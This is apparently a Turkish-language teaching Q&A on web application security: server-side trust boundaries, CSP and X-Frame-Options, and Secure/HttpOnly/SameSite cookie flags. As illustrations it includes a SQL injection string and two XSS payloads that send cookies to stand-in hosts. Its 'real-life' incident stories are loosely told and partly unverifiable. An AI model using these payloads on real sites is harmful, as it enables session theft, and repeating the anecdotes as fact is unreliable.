# Gün 155: Web Uygulama Mimarisi ve Güven Sınırı — Soru & Cevap

---

## 1. Soru: İstemci Tarafı Doğrulama (Client-Side Validation) vs Sunucu Tarafı Güven Sınırı (Server-Side Trust Boundary)

### Soru
Modern tek sayfa uygulamalarında (Single Page Applications - React, Vue, Angular) form alanlarında uygulanan zengin JavaScript doğrulamaları (Regex kontrolleri, uzunluk sınırları, şifre karmaşıklığı, fiyat/bakiye kısıtları) neden bir **güvenlik kontrolü** olarak kabul edilemez? Bu kontrollerin aşılması siber saldırganlar için neden önemsizdir ve sunucu tarafında güven sınırı nasıl tesis edilmelidir?

### Detaylı ve Kapsamlı Teknik Cevap
Web geliştiricileri sıklıkla kullanıcı deneyimini (UX) iyileştirmek için istemci tarafında zengin doğrulamalar yazar: Form boş bırakıldığında anında kırmızı uyarı vermek, parolanın 8 karakterden uzun olduğunu denetlemek veya sepetteki ürün adet/fiyatını hesaplamak.

Ancak siber güvenlik açısından **İstemci Tarafı (Client-Side), tamamen saldırganın kontrolündeki düşman bölgesidir**.

**İstemci Doğrulamalarının Hükümsüz Kılınma Yöntemleri:**
1. **Araya Girme Proxy'leri (Interception Proxies):** Saldırgan Burp Suite, OWASP ZAP veya Fiddler gibi bir araçla tarayıcı ile sunucu arasındaki trafiği yakalar. Tarayıcıda geçerli bir veriyle formu onaylar; ancak paket ağa çıkarken HTTP gövdesini manipüle ederek geçersiz, negatif veya zararlı veriler (örn. `' OR 1=1 --`, `role: admin`, `price: -100`) enjekte eder. Tarayıcının JavaScript motoru bu aşamada baypas edilmiştir.
2. **Doğrudan API Çağrıları (Headless / Direct HTTP Requests):** Saldırgan tarayıcıyı hiç kullanmadan cURL, Postman veya Python `requests` kütüphanesiyle doğrudan API uç noktasına ham HTTP POST/PUT istekleri gönderir. İstemci tarafında yazılmış 10.000 satırlık doğrulama kodu hiç çalıştırılmaz!
3. **Tarayıcı Konsolu ve DOM Manipülasyonu:** Geliştirici konsolunda (`F12`) JavaScript fonksiyonları yeniden tanımlanabilir, `disabled` bayrakları kaldırılabilir veya global değişkenler manipüle edilebilir.

**Sunucu Tarafında Güven Sınırının Kurulması:**
Sunucu tarafı (Application Tier), istemciden gelen her baytı bir **"Sınır Giriş Kontrolünden" (Input Gatekeeper)** geçirmelidir:
* **Şema Doğrulaması (Schema Validation):** Gelen JSON veya form verisi katı şema modelleriyle (Pydantic, Joi, Zod) tip, uzunluk ve içerik bakımından beyaz liste (allowlist) yaklaşımıyla denetlenmelidir.
* **İş Mantığı ve Yetki Kararları Sunucuda Alınmalıdır:** Fiyat asla istemciden parametre olarak alınmaz; ürün ID'si (`product_id`) alınır ve fiyat güvenilir veritabanından çekilir. Kullanıcı rolü asla istek gövdesinden okunmaz; doğrulanmış JWT veya sunucu oturumundan (Session Store) çözümlenir.

### Ustanın Çırağa Tavsiyesi / Altın Kural
Evlat, istemcide yazdığın JavaScript doğrulaması yalnızca kullanıcının canı sıkılmasın, formu hızlı doldursun diye konmuş bir nezaket kuralıdır; bir güvenlik duvarı değil! Bir sistem mimarı olarak kuralın şudur: *"İstemciden gelen her istek, dünyanın en zeki ve en kötü niyetli hacker'ı tarafından özel olarak hazırlanmış bir zehirdir."* Sunucunda doğrulamadığın hiçbir veriyi belleğine veya veritabanına sokmayacaksın!

### Gerçek Hayat Senaryosu / Yaşanmış Olay
2019 yılında popüler bir e-ticaret platformunda acemi bir geliştirici, ödeme adımında sepet tutarını istemci tarafındaki hidden bir input alanından alıyordu (`<input type="hidden" name="amount" value="4500.00">`). Bir saldırgan, 15.000 TL değerindeki bir dizüstü bilgisayarı sepete ekledi. Ödeme butonuna basmadan önce tarayıcının ağ trafiğini Burp Suite ile yakaladı ve `amount` değerini `0.01` olarak değiştirdi. Sunucu tarafı veritabanındaki gerçek ürün fiyatını sorgulamak yerine doğrudan HTTP isteğindeki `0.01` TL'yi bankanın sanal POS'una iletti. Banka 1 kuruşluk çekimi onayladı ve sistem faturayı kesip siparişi kargoya verdi. Şirket günün sonunda binlerce liralık ürünün kuruşlara satıldığını fark ettiğinde zararı yüzbinlerce lirayı aşmıştı. Neden? İstemci-sunucu güven sınırı ihlal edildiği için!

---

## 2. Soru: HTTP Güvenlik Başlıkları (Security Headers) ve XSS / Clickjacking Savunması

### Soru
Modern web uygulamalarında Content-Security-Policy (CSP) ve X-Frame-Options başlıkları tarayıcı seviyesinde nasıl bir savunma kalkanı oluşturur? CSP içinde `'unsafe-inline'` direktifinin bulunması neden CSP'nin koruma kalkanını fiilen deler ve bunun yerine hangi modern yaklaşımlar (Nonce / Hash) benimsenmelidir?

### Detaylı ve Kapsamlı Teknik Cevap
Web tarayıcıları, Aynı Köken Politikası (Same-Origin Policy - SOP) gereğince güvenliği sağlamaya çalışsa da, web sayfasının kaynak koduna enjekte edilen üçüncü taraf içerikleri ayırt etmekte zorlanır. HTTP Güvenlik Başlıkları, sunucunun tarayıcıya verdiği "kesin talimatnamelerdir".

1. **X-Frame-Options ve Clickjacking (Kullanıcı Arayüzü Kırmızılaştırma / UI Redressing):**
   * Saldırgan meşru banka veya sosyal medya sitenizi kendi hazırladığı şeffaf bir `<iframe>` içinde açar. Üzerine çekici bir oyun veya "Ödül Kazandınız - Tıklayın" butonu koyar. Kullanıcı o butona tıkladığında aslında arkadaki görünmez bankacılık "Parayı Gönder" veya "Hesabı Sil" butonuna tıklamış olur.
   * `X-Frame-Options: DENY` başlığı, tarayıcıya bu sayfanın **hiçbir iframe içinde çalıştırılamayacağını** emreder. Clickjacking saldırısı sıfır maliyetle engellenir.

2. **Content-Security-Policy (CSP) ve XSS Savunması:**
   * CSP, sayfada çalışabilecek JavaScript, CSS, görsel ve AJAX isteklerinin izin verilen kaynaklarını (Whitelist) ilan eder.
   * Örneğin: `default-src 'self'; script-src 'self' https://trustedscripts.com; object-src 'none';`
   * Bir saldırgan yorum alanına `<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>` enjekte etmeyi başarsa bile (Reflected/Stored XSS), tarayıcı CSP kuralına bakar: Inline script çalıştırmak yasak olduğu için o zararlı kodu çalıştırmayı reddeder ve konsola CSP ihlali basar.

**`'unsafe-inline'` Neden Ölümcül Bir Deliktir?**
Eğer CSP kuralına `script-src 'self' 'unsafe-inline'` yazılırsa, tarayıcı HTML içine doğrudan yazılmış tüm `<script>` bloklarını çalıştırmaya izin verir. Saldırganın sayfaya enjekte ettiği zararlı XSS script'i de tam olarak bir "inline script" olduğundan, CSP saldırganı engelleyemez ve savunma çöker!

**Modern Güvenli Çözüm: Nonce ve Hash Tabanlı CSP:**
* **Kriptografik Nonce (Number Used Once):** Sunucu her HTTP yanıtı ürettiğinde tek kullanımlık, tahmin edilemez rastgele bir anahtar üretir: `nonce="rAnd0m123"`.
* CSP başlığı: `script-src 'self' 'nonce-rAnd0m123';`
* Meşru script etiketleri: `<script nonce="rAnd0m123">...meşru kod...</script>`.
* Saldırgan sayfaya sonradan kod enjekte etse bile sunucunun o an ürettiği dinamik nonce değerini tahmin edemeyeceği için enjekte ettiği script tarayıcı tarafından engellenir.

### Ustanın Çırağa Tavsiyesi / Altın Kural
Çırağım! Bir web sitesinde CSP kullanmak harikadır; ama içine `'unsafe-inline'` yazmak, çelik kapı takıp anahtarını kapının üzerinde bırakmaya benzer! Güvenlik başlıklarını sadece denetim listesinde (checklist) "var" görünsün diye değil, işlevsel koruma sağlasın diye koyacaksın. `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff` ve katı bir `CSP` her kurumsal web sunucusunun doğum belgesidir!

### Gerçek Hayat Senaryosu / Yaşanmış Olay
2018 yılında küresel bir havayolu şirketinin web sitesine Magecart çetesi tarafından zararlı bir JavaScript kodu enjekte edildi. Saldırganlar üçüncü taraf bir canlı destek (chat) eklentisinin sunucusunu hackleyerek, havayolu şirketinin ödeme sayfasına kredi kartı bilgilerini çalan bir betik soktu. Havayolu şirketinin sitesinde katı bir CSP başlığı olsaydı ve script kaynakları yalnızca şirketin kendi alan adıyla kısıtlansaydı (`script-src 'self'`), tarayıcı saldırganın Rusya'daki veri toplama sunucusuna giden bağlantıyı anında kesecekti. CSP eksikliği nedeniyle 380.000 müşterinin kredi kartı ve CVV bilgileri sızdırıldı ve şirkete 20 milyon sterlin GDPR cezası kesildi.

---

## 3. Soru: Çerez (Cookie) Güvenliği: `Secure`, `HttpOnly`, `SameSite` Bayrakları ve Session Hijacking

### Soru
Web oturum yönetiminde (Session Management) kullanılan `Set-Cookie` başlığındaki `Secure`, `HttpOnly` ve `SameSite` bayraklarının her birinin siber saldırı vektörlerine karşı (Sniffing, XSS, CSRF) üstlendiği spesifik savunma rolleri nelerdir? Bu üç bayraktan birinin dahi eksik bırakılması oturum güvenliğini nasıl tehlikeye atar?

### Detaylı ve Kapsamlı Teknik Cevap
HTTP durumsuz (stateless) bir protokoldür. Bir kullanıcının oturum açtığını ve kim olduğunu takip etmek için sunucu istemciye rastgele bir oturum belirteci (Session ID) verir ve bunu `Set-Cookie` başlığı ile tarayıcıya kaydettirir. Bu çerez, kullanıcının dijital kimlik kartıdır; onu ele geçiren saldırgan kullanıcı gibi davranabilir (Session Hijacking).

İşte bu kimlik kartını koruyan üç kutsal bayrak:

1. **`Secure` Bayrağı (Ağ Düzeyinde Gizleme / Anti-Sniffing):**
   * **Rolü:** Tarayıcıya bu çerezi **yalnızca şifreli TLS/HTTPS bağlantıları üzerinden** sunucuya göndermesini emreder.
   * **Eksik Olursa:** Kullanıcı bir kafede güvensiz bir Wi-Fi ağına bağlıyken tarayıcıda yanlışlıkla `http://site.com` adresine tıklarsa (veya arka planda HTTP ile yüklenen bir görsel çağrılırsa), tarayıcı `Secure` bayrağı olmayan oturum çerezini ağa açık metin olarak basar. Aynı Wi-Fi'daki saldırgan Wireshark ile oturum çerezini anında yakalar ve hesabı ele geçirir.

2. **`HttpOnly` Bayrağı (Uygulama Düzeyinde İzolasyon / Anti-XSS):**
   * **Rolü:** Çereze tarayıcının istemci tarafı API'leri (`document.cookie`, Web Workers) üzerinden JavaScript ile erişilmesini tamamen yasaklar.
   * **Eksik Olursa:** Web sitesinde en ufak bir XSS (Cross-Site Scripting) zafiyeti bulunduğunda, saldırgan sayfaya `<script>new Image().src='http://evil.com/?c='+document.cookie;</script>` enjekte eder. Tarayıcı oturum çerezini saldırgana postalar. `HttpOnly` aktif olduğunda ise `document.cookie` boş döner; saldırgan sayfada XSS çalıştırsa bile kullanıcının oturum çerezini çalamaz!

3. **`SameSite` Bayrağı (Siteler Arası İzolasyon / Anti-CSRF):**
   * **Rolü:** Çerezin siteler arası (Cross-Site) isteklerde gönderilme politikasını belirler:
     - `SameSite=Strict`: Kullanıcı üçüncü taraf bir sitedeki linke tıklasa bile çerez ASLA gönderilmez. En yüksek güvenlik.
     - `SameSite=Lax`: Güvenli gezinme (GET link tıklamaları) için çerez gönderilir; ancak üçüncü taraf sitelerden gelen POST/PUT gibi durum değiştiren isteklerde çerez engellenir.
     - `SameSite=None`: Çerez her türlü siteler arası istekte gönderilir (Sadece `Secure` ile birlikte çalışır).
   * **Eksik Olursa (veya None olursa):** Kullanıcı bankasında oturum açmışken kötü niyetli bir web sitesini ziyaret ederse, o sitedeki gizli bir form kullanıcının tarayıcısına banka hesabından saldırgana para transferi yapan bir POST isteği attırabilir (`CSRF`). Tarayıcı çerezi otomatik ekleyeceği için banka isteği meşru sanır ve onaylar! `SameSite=Lax/Strict` bu saldırıyı kökünden yok eder.

### Ustanın Çırağa Tavsiyesi / Altın Kural
Evlat! Bir oturum çerezi oluştururken `Set-Cookie: session=...; Secure; HttpOnly; SameSite=Lax; Path=/` yazmıyorsan, o sistemi internete açmayacaksın! Bu üç bayrak siber güvenliğin üç silahşorudur: `Secure` ağdaki kulak misafirlerini kovar, `HttpOnly` JavaScript hırsızlarının elini keser, `SameSite` ise sahtekar sitelerin pususunu bozar. Biri eksikse savunman düşer!

### Gerçek Hayat Senaryosu / Yaşanmış Olay
2015 yılında küresel bir sosyal medya platformunda kullanıcı profillerine arka plan müziği ekleme özelliğinde depolanmış (Stored) bir XSS açığı keşfedildi. Saldırganlar profil sayfasına JavaScript enjekte edebiliyordu. Ancak platformun mimarları tüm oturum çerezlerinde istisnasız `HttpOnly` bayrağını zorunlu kılmıştı. XSS açığını bulan saldırganlar, `document.cookie` çağrısı yaptıklarında ekranda hiçbir şey göremediler; çerezler tarayıcının korumalı bellek alanında kilitliydi. Bu sayede 300 milyon kullanıcının oturumu toplu bir hesap ele geçirme (Account Takeover) felaketinden sadece tek bir HTTP başlığı bayrağı sayesinde kurtuldu!
